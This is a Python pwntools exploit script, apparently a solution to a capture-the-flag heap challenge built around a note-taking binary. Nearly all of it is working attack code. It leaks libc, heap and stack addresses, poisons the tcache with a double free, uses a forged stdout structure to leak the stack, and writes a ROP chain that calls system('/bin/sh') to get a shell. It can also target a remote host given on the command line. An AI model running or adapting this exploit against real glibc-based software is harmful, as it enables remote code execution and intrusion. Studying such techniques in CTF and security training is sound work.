#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_note(idx, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", data)

def update_note(idx, data):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", data)

def read_note(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recvline().strip()
    return u64(data.ljust(8, b"\x00"))

def delete_note(idx):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    io.sendlineafter(b":", b'-')
    setvbuf = int((io.recvline().split(b" ")[1]))
    libc.address = setvbuf - 0x816e5
    info("libc base: %#x", libc.address)

    """
    Tcache poisoning to stdout -> FSOP to leak stack from environ
    """

    create_note(0, b"A"*8)
    delete_note(0)

    heap_base = read_note(0) << 12
    info("heap base: %#x", heap_base)

    update_note(0, b"\x00"*9)
    delete_note(0)

    ptr = mangle(heap_base, libc.sym["_IO_2_1_stdout_"])
    fs = p64(0xfbad1887) + p64(0)*3 + p64(libc.sym["environ"]) + p64(libc.sym["environ"]+8)

    update_note(0, p64(ptr))
    create_note(1, p64(ptr))
    create_note(2, fs)

    stack = io.recvline().split(b" ")[1].strip(b"\n")
    saved_rip = u64(stack) - 0x178 - 0x10
    info("saved rip: %#x", saved_rip)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    payload = flat(
        [
            0x0,
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            pop_rdi + 1,
            libc.sym["system"]
        ]
    )

    ptr = mangle(heap_base, saved_rip)

    """
    Double free on tcache
    """

    delete_note(1)
    update_note(1, b"A"*9)
    delete_note(1)
    update_note(1, p64(ptr))

    """
    Tcache poisoning then write ropchain on stack
    """

    create_note(3, b"junk")
    create_note(4, payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

